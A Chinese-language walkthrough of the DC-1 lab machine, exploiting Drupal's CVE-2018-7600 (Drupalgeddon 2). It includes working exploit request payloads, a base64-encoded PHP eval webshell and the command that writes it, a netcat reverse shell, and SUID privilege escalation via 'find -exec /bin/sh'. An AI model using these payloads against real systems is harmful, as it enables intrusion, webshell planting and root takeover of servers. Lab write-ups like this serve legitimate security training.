

> 环境

- Kali Linux
- DC-1靶场

---



## 信息收集

> **1.主机发现**  
>
> 使用nmap进行扫描 【-sP  ping扫描】

![image-20240403181921391](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403181921391.png)

如上图，我们可以得到dc-1主机的IP；

> **2.端口扫描**
>
> 使用nmap进行端口扫描 【-A全面扫描， -Pn无ping扫描， -p-所以端口，-sS半连接扫描， -T4扫描速度4档】

![image-20240403182130648](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403182130648.png)

我们发现，该主机开了22端口，所以可以进行ssh远程，还开通了80端口，运行了Apache httpd服务，我们可以访问一下httpd

![image-20240403202358841](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403202358841.png)

---

## 漏洞发现

通过使用AWVS漏洞扫描工具，可以发现，该web服务有非常严重的RCE漏洞，该漏洞编号为【CVE-2018-7600】

![image-20240403202709601](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403202709601.png)

![image-20240403195749557](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403195749557.png)

## 漏洞验证

由于扫描工具会有误报和漏报的风险，所以需要我们来手动验证漏洞是否真的存在；

![image-20240403195821983](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403195821983.png)

我们使用BP来截取请求，并将其发送到重发模块，将请求更改为POST方式；

> 根据AWVS的提示，构建第一次请求，目的是执行whoami

```
/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=whoami
form_id=user_pass&_triggering_element_name=name
```

![image-20240403193523941](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403193523941.png)

> 获取第一次请求得到的form_build_id值，重新构建请求，再次提交

```
/?q=file/ajax/name/%23value/form-AO-ame23pCsfvN8cP5oRIl9dhiPY7wc2NHuksM9W0Cc
form_build_id=form-AO-ame23pCsfvN8cP5oRIl9dhiPY7wc2NHuksM9W0Cc
```

![image-20240403193619948](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403193619948.png)

可以看到`whoami`命令成功执行，并显示结果，故确实存在该RCE漏洞，漏洞验证成功；



## 漏洞利用

### 构建木马

既然存在RCE漏洞，那么我们就可以通过上传木马获取该服务的webshell

> 构建一句话木马

一句话木马主体：

```
<?php @eval($_REQUEST[cmd])?>
```

将其进行base64编码:

```
PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pPz4=
```

构建完整命令，创建一句话木马文件 

```
echo "PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pPz4="|base64 -d|tee ./yjh.php
```

由于是url传输，所以需要进行url编码

```
echo%20%22PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pPz4%3D%22%7Cbase64%20-d%7Ctee%20.%2Fyjh.php
```

> 提交

![image-20240403194504532](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403194504532.png)

![image-20240403194611545](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403194611545.png)

可以看到，按照漏洞验证的步骤进行命令执行，一句话木马已经成功创建

![image-20240403194810493](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403194810493.png)

---

> 使用中国蚁剑进行连接

![image-20240403195432205](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403195432205.png)

可以看到，已经完美的获取了目标的webshell；

---

### 反弹shell

> 反弹shell  -建立shell通道 使用netcat

![image-20240403200400442](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403200400442.png)

既然目标主机存在netcat，并且有-e的参数，所以可以直接建立shell通道；

1.攻击机侦听1314端口；

2.目标机建立到攻击机的TCP连接，并在连接建立后在目标主机上打开一个Bash shell，允许用户执行命令。

![image-20240403200558859](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403200558859.png)

可以看到，shell通道已经打通；

### 权限提升 --SUID提权

- 提权前提是持久化连接，由于我们已经做好了反弹shell，所以可以直接进行权限提升；
- SUID是Linux系统中的一种特殊权限，在一个可执行文件拥有SUID权限时，当该文件被执行时，这个进程会以文件所有者的身份来运行，而不是以执行者自身的身份来运行。

---

> 1.找到具有SUID权限的文件:
>
> - 可以使用命令`find / -perm -u=s -type f 2>/dev/null`来查找这些文件。

```sh
find / -perm -u=s 2>/dev/null #-perm 权限;  -u=s 最少有sid权限；
```

> 2.find 提权:
>
> - 通过 `find / -perm -u=s` 找到这些具有 SUID 权限的文件后，可以在其中一个文件上执行 `/bin/sh` 命令，从而启动一个具有管理员权限的 Shell。

```sh
mkdir ww
find ww -exec '/bin/sh' \; #新创建的 ww 目录中执行 "/bin/sh"，也就是启动一个新的Shell
```

![image-20240403201343808](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403201343808.png)

![image-20240403201527854](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240403201527854.png)

可以看到，执行`whoami`返回是是root，可知提权成功；

---



## 漏洞信息

> 漏洞描述

CVE-2018-7600，也被称为Drupalgeddon 2，是Drupal核心中的一个高危安全漏洞。该漏洞影响Drupal 6、7和8版本，被认为是Drupal历史上最严重的漏洞之一。CVE-2018-7600的严重性在于它允许远程攻击者利用漏洞执行任意代码，从而完全控制受感染的Drupal网站。

> 漏洞原理

该漏洞的主要原因是Drupal核心中的输入验证不足，使得攻击者可以构造特制的HTTP请求，绕过访问控制、验证和过滤机制，进而执行恶意代码。攻击者可以利用这个漏洞在Drupal网站中执行各种操作，包括但不限于安装后门、窃取敏感信息、篡改网站内容等。

> 漏洞防御

升级Drupal核心：在漏洞被披露后，Drupal社区发布了修复版本。

---



